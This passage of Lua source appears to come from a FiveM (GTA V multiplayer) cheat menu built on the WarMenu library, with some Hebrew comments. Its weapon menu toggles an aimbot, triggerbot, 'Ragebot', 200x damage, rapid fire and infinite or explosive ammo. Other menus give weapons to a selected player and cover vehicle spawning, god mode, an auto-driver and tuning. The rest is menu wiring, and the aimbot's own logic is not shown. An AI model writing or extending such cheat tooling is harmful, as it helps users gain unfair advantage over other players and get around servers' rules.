                    NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
                    end) then
            end
        
        -- WEAPON OPTIONS MENU
        elseif WarMenu.IsMenuOpened('weapon') then
            if WarMenu.MenuButton("Give Weapon", 'weaponspawner') then
                selectedPlayer = PlayerId()
            elseif WarMenu.Button("Give All Weapons") then
                GiveAllWeapons(PlayerId())
                elseif WarMenu.Button("Set All Attachments") then
    SetAllWeaponAttachments()
elseif WarMenu.CheckBox("No Recoil", noRecoilEnabled, "Off", "On") then
    noRecoilEnabled = not noRecoilEnabled

    
            elseif WarMenu.Button("Strip All Weapons") then
                StripPlayer(PlayerId())
            elseif WarMenu.Button("Give Max Ammo") then
                GiveMaxAmmo(PlayerId())
            elseif WarMenu.CheckBox("Infinite Ammo", InfAmmo) then
                InfAmmo = not InfAmmo
                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
            elseif WarMenu.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                ExplosiveAmmo = not ExplosiveAmmo
            elseif WarMenu.CheckBox("Force Gun", ForceGun) then
                ForceGun = not ForceGun
                elseif WarMenu.CheckBox("Crosshair", crosshairEnabled, "Off", "On") then
    crosshairEnabled = not crosshairEnabled
            elseif WarMenu.CheckBox("Super Damage", SuperDamage) then
                SuperDamage = not SuperDamage
                if SuperDamage then
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                else
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                end
            elseif WarMenu.CheckBox("Rapid Fire", RapidFire) then
                RapidFire = not RapidFire
            elseif WarMenu.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif WarMenu.ComboBox("Aimbot Bone Target", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                currAimbotBoneIndex = currentIndex
                selAimbotBoneIndex = currentIndex
                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
            end) then
                elseif WarMenu.CheckBox("Draw Aimbot FOV", DrawFov) then
                DrawFov = not DrawFov
                elseif WarMenu.CheckBox("Triggerbot", Triggerbot) then
                    Triggerbot = not Triggerbot
                elseif WarMenu.CheckBox("~r~Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end
        
        
        -- SPECIFIC WEAPON MENU
        elseif WarMenu.IsMenuOpened('weaponspawner') then
            if WarMenu.MenuButton('Melee Weapons', 'melee') then
            elseif WarMenu.MenuButton('Pistols', 'pistol') then
            elseif WarMenu.MenuButton('SMGs / MGs', 'smg') then
            elseif WarMenu.MenuButton('Shotguns', 'shotgun') then
            elseif WarMenu.MenuButton('Assault Rifles', 'assault') then
            elseif WarMenu.MenuButton('Sniper Rifles', 'sniper') then
            elseif WarMenu.MenuButton('Thrown Weapons', 'thrown') then
            elseif WarMenu.MenuButton('Heavy Weapons', 'heavy') then
			end
        
        -- MELEE WEAPON MENU
        elseif WarMenu.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if WarMenu.Button(meleeweapons[i][2]) then
                    GiveWeapon(selectedPlayer, meleeweapons[i][1])
                end
            end
        -- PISTOL MENU
        elseif WarMenu.IsMenuOpened('pistol') then
            for i = 1, #pistolweapons do
                if WarMenu.Button(pistolweapons[i][2]) then
                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
                end
            end
        -- SMG MENU
        elseif WarMenu.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if WarMenu.Button(smgweapons[i][2]) then
                    GiveWeapon(selectedPlayer, smgweapons[i][1])
                end
            end
        -- SHOTGUN MENU
        elseif WarMenu.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if WarMenu.Button(shotgunweapons[i][2]) then
                    GiveWeapon(selectedPlayer, shotgunweapons[i][1])
                end
            end
        -- ASSAULT RIFLE MENU
        elseif WarMenu.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if WarMenu.Button(assaultweapons[i][2]) then
                    GiveWeapon(selectedPlayer, assaultweapons[i][1])
                end
            end
        -- SNIPER MENU
        elseif WarMenu.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if WarMenu.Button(sniperweapons[i][2]) then
                    GiveWeapon(selectedPlayer, sniperweapons[i][1])
                end
            end
        -- THROWN WEAPON MENU
        elseif WarMenu.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if WarMenu.Button(thrownweapons[i][2]) then
                    GiveWeapon(selectedPlayer, thrownweapons[i][1])
                end
            end
        -- HEAVY WEAPON MENU
        elseif WarMenu.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if WarMenu.Button(heavyweapons[i][2]) then
                    GiveWeapon(selectedPlayer, heavyweapons[i][1])
                end
            end
        
        
        -- VEHICLE OPTIONS MENU
        elseif WarMenu.IsMenuOpened('vehicle') then
            if WarMenu.MenuButton("Vehicle Spawner", 'vehiclespawner') then end
            if WarMenu.MenuButton("Vehicle Mods", 'vehiclemods') then end
             if WarMenu.MenuButton("Vehicle Modifiers", 'vehiclemodifiers') then end
             
            if WarMenu.CheckBox("Auto-Repair", AutoRepair) then
                AutoRepair = not AutoRepair
                ShowInfo("Auto Repair ~g~" .. (AutoRepair and "ENABLED" or "~r~DISABLED"))
            end
            if WarMenu.Button("Fix Car") then
                local ped = PlayerPedId()
                local veh = GetVehiclePedIsIn(ped, false)
                if veh ~= 0 then
                    SetVehicleFixed(veh)
                    SetVehicleDirtLevel(veh, 0.0)
                    SetVehicleUndriveable(veh, false)
                    SetVehicleEngineHealth(veh, 1000.0)
                    SetVehicleEngineOn(veh, true, true, false)
                    ShowInfo("~g~Car Fixed!")
                end
            end
            if WarMenu.CheckBox("Vehicle God Mode", VehicleGodModeEnabled, "Off", "On") then
        VehicleGodModeEnabled = not VehicleGodModeEnabled
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            SetEntityInvincible(veh, VehicleGodModeEnabled)
            SetVehicleCanBeVisiblyDamaged(veh, not VehicleGodModeEnabled)
            if VehicleGodModeEnabled then
                ShowInfo("~g~Vehicle God Mode enabled!")
            else
                ShowInfo("~r~Vehicle God Mode disabled!")
            end
        else
            VehicleGodModeEnabled = false
            ShowInfo("You are not in a vehicle!")
        end
    end
if WarMenu.CheckBox("Unlock/Lock Car", lockCarFeature, "Off", "On") then
    lockCarFeature = not lockCarFeature
    if lockCarFeature then
        ShowInfo("~g~Unlock/Lock Car enabled\nPress ~y~E ~w~to lock or unlock the nearest vehicle")
    else
        ShowInfo("~r~Unlock/Lock Car disabled")
    end
end

    
            if WarMenu.Button("Auto Driver") then
    -- הקוד המקורי שלך נשאר בדיוק כפי שהבאת
    local driving = false
    local instructionsShown = false
    local aggressiveMode = false

    -- Show side notification
    function ShowNotification(msg)
        SetNotificationTextEntry("STRING")
        AddTextComponentSubstringPlayerName(msg)
        DrawNotification(false, true)
    end

    -- Get waypoint location
    function GetWaypointCoords()
        local blip = GetFirstBlipInfoId(8)
        if DoesBlipExist(blip) then
            return GetBlipInfoIdCoord(blip)
        else
            return nil
        end
    end

    -- Get driving style and speed
    function GetDrivingParams()
        if aggressiveMode then
            return {
                speed = 120.0,
                style = 524863 -- CUSTOM AGGRESSIVE STYLE: Ignore cars, lights, lanes, brakes
            }
        else
            return {
                speed = 30.0,
                style = 786603 -- Safe style
            }
        end
    end

    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)
            local playerPed = PlayerPedId()

            -- Show usage once
            if IsPedInAnyVehicle(playerPed, false) and not instructionsShown then
                ShowNotification("🧭 Press ~g~F11~s~ to auto-drive to your waypoint.")
                ShowNotification("🛑 Press ~y~F10~s~ to stop auto-drive.")
                ShowNotification("⚙️ Press ~b~F9~s~ to toggle driving mode (Safe / Aggressive).")
                instructionsShown = true
            elseif not IsPedInAnyVehicle(playerPed, false) then
                instructionsShown = false
            end

            -- F9 - Toggle mode
            if IsControlJustPressed(0, 56) then
                aggressiveMode = not aggressiveMode
                if aggressiveMode then
                    ShowNotification("🔥 ~r~Aggressive driving mode enabled.")
                else
                    ShowNotification("🛡️ ~g~Safe driving mode enabled.")
                end
            end

            -- F11 - Start auto-drive
            if IsControlJustPressed(0, 344) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)

                if vehicle == 0 then
                    ShowNotification("🚗 ~r~You must be inside a vehicle.")
                    return
                end

                local waypoint = GetWaypointCoords()
                if not waypoint then
                    ShowNotification("📍 ~r~No waypoint set on the map.")
                    return
                end

                local driveParams = GetDrivingParams()

                TaskVehicleDriveToCoord(
                    playerPed,
                    vehicle,
                    waypoint.x, waypoint.y, waypoint.z,
                    driveParams.speed,
                    0,
                    GetEntityModel(vehicle),
                    driveParams.style,
                    1.0,
                    true
                )

                driving = true
                ShowNotification("🧭 ~g~Auto-drive started.")
            end

            -- F10 - Stop
            if driving and IsControlJustPressed(0, 57) then
                ClearPedTasks(PlayerPedId())
                driving = false
                ShowNotification("🛑 ~y~Auto-drive stopped.")
            end
        end
    end)
end
            if WarMenu.CheckBox("Motorcycle Seatbelt", motorcycleSeatbeltEnabled, "Off", "On") then
    motorcycleSeatbeltEnabled = not motorcycleSeatbeltEnabled
    if motorcycleSeatbeltEnabled then
        Citizen.CreateThread(function()
            while motorcycleSeatbeltEnabled do
                Citizen.Wait(0)
                local playerPed = PlayerPedId()

                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)

                    -- בדיקה אם זה אופנוע
                    if GetVehicleClass(vehicle) == 8 then
                        -- לא מאפשר לנפול מהאופנוע
                        SetPedCanRagdoll(playerPed, false)
                        SetPedConfigFlag(playerPed, 32, false) -- PED_FLAG_CAN_FLY_THRU_WINDSCREEN
                        SetPedConfigFlag(playerPed, 33, false) -- PED_FLAG_CAN_BE_KNOCKED_OFF_BIKE
                        SetPedConfigFlag(playerPed, 60, false) -- PED_FLAG_60 (נפילה מיותרת)
                        SetPedConfigFlag(playerPed, 104, false) -- PED_FLAG_104
                        SetPedConfigFlag(playerPed, 149, false) -- PED_FLAG_FORCE_RAGDOLL

                        -- לא מאפשר לדמות ליפול גם בהתנגשות
                        SetPedCanBeKnockedOffVehicle(playerPed, 1) -- NEVER_KNOCKED_OFF
                    end
                end
            end
            -- כיבוי בטוח כשהתכונה נכבית
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) and GetVehicleClass(GetVehiclePedIsIn(playerPed, false)) == 8 then
                SetPedCanRagdoll(playerPed, true)
                SetPedConfigFlag(playerPed, 32, true)
                SetPedConfigFlag(playerPed, 33, true)
                SetPedConfigFlag(playerPed, 60, true)
                SetPedConfigFlag(playerPed, 104, true)
                SetPedConfigFlag(playerPed, 149, true)
                SetPedCanBeKnockedOffVehicle(playerPed, 2) -- חזרה למצב רגיל
            end
        end)
    end
end
            if WarMenu.CheckBox("Shift Boost", ShiftBoostEnabled) then
                ShiftBoostEnabled = not ShiftBoostEnabled
                ShowInfo("Shift Boost ~g~" .. (ShiftBoostEnabled and "ENABLED" or "~r~DISABLED"))
            end
            if WarMenu.Button("Flip Vehicle") then
                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                if veh ~= 0 then
                    SetVehicleOnGroundProperly(veh)
                end
            end
            if WarMenu.Button("Max Tune Vehicle") then
                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                if veh ~= 0 then
                    SetVehicleModKit(veh, 0)
                    for i = 0, 24 do
                        if i ~= 18 and i ~= 22 then
                            SetVehicleMod(veh, i, GetNumVehicleMods(veh, i) - 1, false)
                        end
                    end
                    SetVehicleNumberPlateText(veh, "A&T MENU")
                    SetVehicleColours(veh, 120, 120)
                    SetVehicleExtraColours(veh, 120, 120)
                    ShowInfo("Vehicle fully tuned!")
                end
            end
            
        
        -- VEHICLE SPAWNER MENU
        elseif WarMenu.IsMenuOpened('vehiclespawner') then
            if WarMenu.Button("Spawn Vehicle By Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                SpawnVeh(model, PlaceSelf, SpawnEngineOn)
            elseif WarMenu.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                PlaceSelf = not PlaceSelf
            elseif WarMenu.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                SpawnInAir = not SpawnInAir
            elseif WarMenu.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                SpawnEngineOn = not SpawnEngineOn
            elseif WarMenu.MenuButton('Compacts', 'compacts') then
            elseif WarMenu.MenuButton('Sedans', 'sedans') then
            elseif WarMenu.MenuButton('SUVs', 'suvs') then
            elseif WarMenu.MenuButton('Coupes', 'coupes') then
            elseif WarMenu.MenuButton('Muscle', 'muscle') then
            elseif WarMenu.MenuButton('Sports Classics', 'sportsclassics') then
            elseif WarMenu.MenuButton('Sports', 'sports') then
            elseif WarMenu.MenuButton('Super', 'super') then
            elseif WarMenu.MenuButton('Motorcycles', 'motorcycles') then
            elseif WarMenu.MenuButton('Off-Road', 'offroad') then
            elseif WarMenu.MenuButton('Industrial', 'industrial') then
            elseif WarMenu.MenuButton('Utility', 'utility') then
            elseif WarMenu.MenuButton('Vans', 'vans') then
			elseif WarMenu.MenuButton('Cycles', 'cycles') then
			elseif WarMenu.MenuButton('Boats', 'boats') then
			elseif WarMenu.MenuButton('Helicopters', 'helicopters') then
			elseif WarMenu.MenuButton('Planes', 'planes') then
			elseif WarMenu.MenuButton('Service/Emergency/Military', 'service') then
			elseif WarMenu.MenuButton('Commercial/Trains', 'commercial') then
			end
        
        -- COMPACTS SPAWNER
        elseif WarMenu.IsMenuOpened('compacts') then
            for i = 1, #compacts do
                local vehname = GetLabelText(compacts[i])
                if vehname == "NULL" then vehname = compacts[i] end -- Avoid getting NULL (for some reason GetLabelText returns null for some vehs)
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SEDANS SPAWNER
        elseif WarMenu.IsMenuOpened('sedans') then
            for i = 1, #sedans do
                local vehname = GetLabelText(sedans[i])
                if vehname == "NULL" then vehname = sedans[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUVs SPAWNER
        elseif WarMenu.IsMenuOpened('suvs') then
            for i = 1, #suvs do
                local vehname = GetLabelText(suvs[i])
                if vehname == "NULL" then vehname = suvs[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COUPES SPAWNER
        elseif WarMenu.IsMenuOpened('coupes') then
            for i = 1, #coupes do
                local vehname = GetLabelText(coupes[i])
                if vehname == "NULL" then vehname = coupes[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MUSCLE SPAWNER
        elseif WarMenu.IsMenuOpened('muscle') then
            for i = 1, #muscle do
                local vehname = GetLabelText(muscle[i])
                if vehname == "NULL" then vehname = muscle[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTSCLASSICS SPAWNER
        elseif WarMenu.IsMenuOpened('sportsclassics') then
            for i = 1, #sportsclassics do
                local vehname = GetLabelText(sportsclassics[i])
                if vehname == "NULL" then vehname = sportsclassics[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTS SPAWNER
        elseif WarMenu.IsMenuOpened('sports') then
            for i = 1, #sports do
                local vehname = GetLabelText(sports[i])
                if vehname == "NULL" then vehname = sports[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUPER SPAWNER
        elseif WarMenu.IsMenuOpened('super') then
            for i = 1, #super do
                local vehname = GetLabelText(super[i])
                if vehname == "NULL" then vehname = super[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MOTORCYCLES SPAWNER
        elseif WarMenu.IsMenuOpened('motorcycles') then
            for i = 1, #motorcycles do
                local vehname = GetLabelText(motorcycles[i])
                if vehname == "NULL" then vehname = motorcycles[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(motorcycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- OFFROAD SPAWNER
        elseif WarMenu.IsMenuOpened('offroad') then
            for i = 1, #offroad do
                local vehname = GetLabelText(offroad[i])
                if vehname == "NULL" then vehname = offroad[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- INDUSTRIAL SPAWNER
        elseif WarMenu.IsMenuOpened('industrial') then
            for i = 1, #industrial do
                local vehname = GetLabelText(industrial[i])
                if vehname == "NULL" then vehname = industrial[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- UTILITY SPAWNER
        elseif WarMenu.IsMenuOpened('utility') then
            for i = 1, #utility do
                local vehname = GetLabelText(utility[i])
                if vehname == "NULL" then vehname = utility[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VANS SPAWNER
        elseif WarMenu.IsMenuOpened('vans') then
            for i = 1, #vans do
                local vehname = GetLabelText(vans[i])
                if vehname == "NULL" then vehname = vans[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- CYCLES SPAWNER
        elseif WarMenu.IsMenuOpened('cycles') then
            for i = 1, #cycles do
                local vehname = GetLabelText(cycles[i])
                if vehname == "NULL" then vehname = cycles[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- BOATS SPAWNER
        elseif WarMenu.IsMenuOpened('boats') then
            for i = 1, #boats do
                local vehname = GetLabelText(boats[i])
                if vehname == "NULL" then vehname = boats[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- HELICOPTERS SPAWNER
        elseif WarMenu.IsMenuOpened('helicopters') then
            for i = 1, #helicopters do
                local vehname = GetLabelText(helicopters[i])
                if vehname == "NULL" then vehname = helicopters[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- PLANES SPAWNER
        elseif WarMenu.IsMenuOpened('planes') then
            for i = 1, #planes do
                local vehname = GetLabelText(planes[i])
                if vehname == "NULL" then vehname = planes[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
                end
            end
        
        -- SERVICE SPAWNER
        elseif WarMenu.IsMenuOpened('service') then
            for i = 1, #service do
                local vehname = GetLabelText(service[i])
                if vehname == "NULL" then vehname = service[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COMMERCIAL SPAWNER
        elseif WarMenu.IsMenuOpened('commercial') then
            for i = 1, #commercial do
                local vehname = GetLabelText(commercial[i])
                if vehname == "NULL" then vehname = commercial[i] end
                local carButton = WarMenu.Button(vehname)
                if carButton then
                    SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VEHICLE MODS MENU
        elseif WarMenu.IsMenuOpened('vehiclemods') then
            if WarMenu.MenuButton("Vehicle Colors", 'vehiclecolors') then
                elseif WarMenu.MenuButton("Tune Vehicle", 'vehicletuning') then
                elseif WarMenu.Button("Set Plate Text (8 Characters)") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)
             end
        

             
        -- VEHICLE COLORS MENU
        elseif WarMenu.IsMenuOpened('vehiclecolors') then
            if WarMenu.MenuButton("Primary Color", 'vehiclecolors_primary') then
                elseif WarMenu.MenuButton("Secondary Color", 'vehiclecolors_secondary') then
                
            end
        
        elseif WarMenu.IsMenuOpened('vehiclecolors_primary') then
            if WarMenu.MenuButton("Classic Colors", 'primary_classic') then
                elseif WarMenu.MenuButton("Matte Colors", 'primary_matte') then
                elseif WarMenu.MenuButton("Metals", 'primary_metal') then
            end
        
        elseif WarMenu.IsMenuOpened('vehiclecolors_secondary') then
            if WarMenu.MenuButton("Classic Colors", 'secondary_classic') then
                elseif WarMenu.MenuButton("Matte Colors", 'secondary_matte') then
                elseif WarMenu.MenuButton("Metals", 'secondary_metal') then
            end
        
        -- PRIMARY CLASSIC
        elseif WarMenu.IsMenuOpened('primary_classic') then
            for i = 1, #classicColors do
                if WarMenu.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, classicColors[i][2], sec)
                end
            end
        
        -- PRIMARY MATTE
        elseif WarMenu.IsMenuOpened('primary_matte') then
            for i = 1, #matteColors do
                if WarMenu.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, matteColors[i][2], sec)
                end
            end
        
        -- PRIMARY METAL
        elseif WarMenu.IsMenuOpened('primary_metal') then
            for i = 1, #metalColors do
                if WarMenu.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, metalColors[i][2], sec)
                end
            end
        
        -- SECONDARY CLASSIC
        elseif WarMenu.IsMenuOpened('secondary_classic') then
            for i = 1, #classicColors do
                if WarMenu.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, classicColors[i][2])
                end
            end
        
        -- SECONDARY MATTE
        elseif WarMenu.IsMenuOpened('secondary_matte') then
            for i = 1, #matteColors do
                if WarMenu.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, matteColors[i][2])
                end
            end
        
        -- SECONDARY METAL
        elseif WarMenu.IsMenuOpened('secondary_metal') then
            for i = 1, #metalColors do
                if WarMenu.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, metalColors[i][2])
                end
            end
        
        -- VEHICLE TUNING MENU
elseif WarMenu.IsMenuOpened('vehicletuning') then
    if WarMenu.Button("Repair Vehicle") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleFixed(vehicle)
            ShowInfo("Vehicle repaired!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Clean Vehicle") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleDirtLevel(vehicle, 0.0)
            ShowInfo("Vehicle cleaned!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Set Primary Color - Red") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleColours(vehicle, 1, GetVehicleExtraColours(vehicle))
            ShowInfo("Primary color set to Red!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Set Primary Color - Blue") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleColours(vehicle, 3, GetVehicleExtraColours(vehicle))
            ShowInfo("Primary color set to Blue!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Upgrade Engine") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleMod(vehicle, 11, 3, false) -- Engine upgrade level 3
            ShowInfo("Engine upgraded!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Upgrade Brakes") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleMod(vehicle, 12, 2, false) -- Brakes upgrade level 2
            ShowInfo("Brakes upgraded!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Add Turbo") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            ToggleVehicleMod(vehicle, 18, true) -- Enable Turbo
            ShowInfo("Turbo added!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Upgrade Xenon Lights") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            ToggleVehicleMod(vehicle, 22, true) -- Enable Xenon Lights
            ShowInfo("Xenon Lights upgraded!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    elseif WarMenu.Button("Upgrade Suspension") then
        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        if vehicle ~= 0 then
            SetVehicleMod(vehicle, 15, 3, false) -- Suspension upgrade level 3
            ShowInfo("Suspension upgraded!")
        else
            ShowInfo("You are not in a vehicle!")
        end
    end        
        -- VEHICLE MENU (WIP)
        elseif WarMenu.IsMenuOpened('vehiclemenu') then
            if WarMenu.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
					SavedVehicle = not SavedVehicle
					RemoveBlip(pvblip)
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvblip = AddBlipForEntity(pvehicle)
					SetBlipSprite(pvblip, 225) -- Full list of blips https://marekkraus.sk/gtav/blips/list.html
					SetBlipColour(pvblip, 84) -- Full list of the available blips colors https://i.imgur.com/Hvyx6cE.png
					ShowInfo("~g~Current Vehicle Saved")
					pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                elseif SavedVehicle then
					SavedVehicle = not SavedVehicle
					pvehicle = nil
                    RemoveBlip(pvblip)
					ShowInfo("~b~Saved Vehicle Blip Removed")
				else
					ShowInfo("~r~You are not in a vehicle!")
                end

                -- Whenever the entity changes, the blip and entity needs to be reseted. Lots of other checks need to be made. (WIP)

            elseif WarMenu.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
                LeftFrontDoor = not LeftFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftFrontDoor then
                    SetVehicleDoorOpen(vehicle, 0, nil, true)
                elseif not LeftFrontDoor then
                    SetVehicleDoorShut(vehicle, 0, true)
                end
            elseif WarMenu.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then -- Is closing when the driver seat has someone
                RightFrontDoor = not RightFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightFrontDoor then
					SetVehicleDoorOpen(vehicle, 1, nil, true)
                elseif not RightFrontDoor then
					SetVehicleDoorShut(vehicle, 1, true)
                end
            elseif WarMenu.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
                LeftBackDoor = not LeftBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftBackDoor then
					SetVehicleDoorOpen(vehicle, 2, nil, true)
                elseif not LeftBackDoor then
					SetVehicleDoorShut(vehicle, 2, true)
                end
            elseif WarMenu.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
                RightBackDoor = not RightBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightBackDoor then
					SetVehicleDoorOpen(vehicle, 3, nil, true)
                elseif not RightBackDoor then
					SetVehicleDoorShut(vehicle, 3, true)
                end
            elseif WarMenu.CheckBox("Hood", FrontHood, "Closed", "Opened") then
                FrontHood = not FrontHood
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if FrontHood then
					SetVehicleDoorOpen(vehicle, 4, nil, true)
                elseif not FrontHood then
					SetVehicleDoorShut(vehicle, 4, true)
                end
            elseif WarMenu.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                Trunk = not Trunk
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Trunk then
					SetVehicleDoorOpen(vehicle, 5, nil, true)
                elseif not Trunk then
					SetVehicleDoorShut(vehicle, 5, true)
                end
            elseif WarMenu.CheckBox("Back", Back, "Closed", "Opened") then
                Back = not Back
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back then
					SetVehicleDoorOpen(vehicle, 6, nil, true)
                elseif not Back then
					SetVehicleDoorShut(vehicle, 6, true)
                end
            elseif WarMenu.CheckBox("Back 2", Back2, "Closed", "Opened") then
                Back2 = not Back2
